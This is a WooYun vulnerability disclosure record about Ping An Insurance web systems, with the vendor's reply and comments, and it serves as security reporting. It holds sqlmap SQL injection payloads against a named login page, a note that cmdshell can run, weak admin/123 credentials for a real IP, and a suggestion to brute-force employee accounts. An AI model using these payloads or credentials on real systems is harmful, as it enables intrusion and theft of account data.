{"id": 2505, "wybug_id": "wooyun-2014-065329", "wybug_title": "平安保险某系统一枚SQL注射导致沦陷多个系统危及2W8个UM账户信息,目测可涉及其他系统安全", "wybug_corp": "中国平安保险（集团）股份有限公司", "wybug_author": "袋鼠妈妈", "wybug_date": "2014-06-18 08:44", "wybug_open_date": "2014-08-02 08:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "信息泄漏", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向公众公开  简要描述： 平安保险某系统一枚SQL注射导致沦陷多个系统,危及2W8个UM账户信息,目测可涉及其他系统安全(另外包括:目录遍历/网站目录备份下载/弱口令等隐患) 详细说明：  1.地址:\nhttp://www.pabaoxian.com/WebLogin.aspx\n登陆处含POST SQL注入:\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TextBox2    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase stacked conditional-error blind queries    Payload: __VIEWSTATE=/wEPDwUKLTY4NzcyMTIyMmQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFDEltYWdlQnV0dG9uMXOEBmDnUeHhudcIKZBr/j7leE0H&__EVENTVALIDATION=/wEWBALfrdrVBQLs0bLrBgLs0fbZDALSwpnTCBz0Y8RXEpBU6Wv9eN2/T1is36Bs&TextBox1=admin&TextBox2=123'; IF(1587=1587) SELECT 1587 ELSE DROP FUNCTION QdOx--&ImageButton1.x=28&ImageButton1.y=6Place: POSTParameter: TextBox1    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase stacked conditional-error blind queries    Payload: __VIEWSTATE=/wEPDwUKLTY4NzcyMTIyMmQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFDEltYWdlQnV0dG9uMXOEBmDnUeHhudcIKZBr/j7leE0H&__EVENTVALIDATION=/wEWBALfrdrVBQLs0bLrBgLs0fbZDALSwpnTCBz0Y8RXEpBU6Wv9eN2/T1is36Bs&TextBox1=admin%'; IF(8529=8529) SELECT 8529 ELSE DROP FUNCTION geXA--&TextBox2=123&ImageButton1.x=28&ImageButton1.y=6---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n\n\n包含多个数据库，并能执行cmdshell进行渗透\navailable databases [9]:[*] master[*] model[*] msdb[*] Policy[*] ReportServer[*] ReportServerTempDB[*] SubmitPolicy[*] tempdb[*] Traval1\n2.该服务器上还运行着其他网站:(1)平安养老险弹性计划注册系统\nhttp://211.154.151.210/\n该网站存在目录遍历及网站数据备份下载:\n\n\n\n\n\n\n\n该处员工UM差不多有2w8多个,其平安很多系统又是通过UM帐号进行登录的,可以尝试爆破进一步渗透。（如网站http://sales.pa18.com/）\n\n(2)\nhttp://211.154.151.210:88/\n 弱口令 admin / 123\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 袋鼠妈妈@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-06-22 18:15 厂商回复： 网站为外部厂家开发的试运行网站，该网站已经完全关闭 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-02 12:08 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  才给3，我都替厂商不好意思了    \n     2014-08-02 18:29 |    \t\tArthur \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:33        | USA，I am coming！！！！！)\t\t \n  .......网站是不运行了，但是用户信息依然存在。真是不负责。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}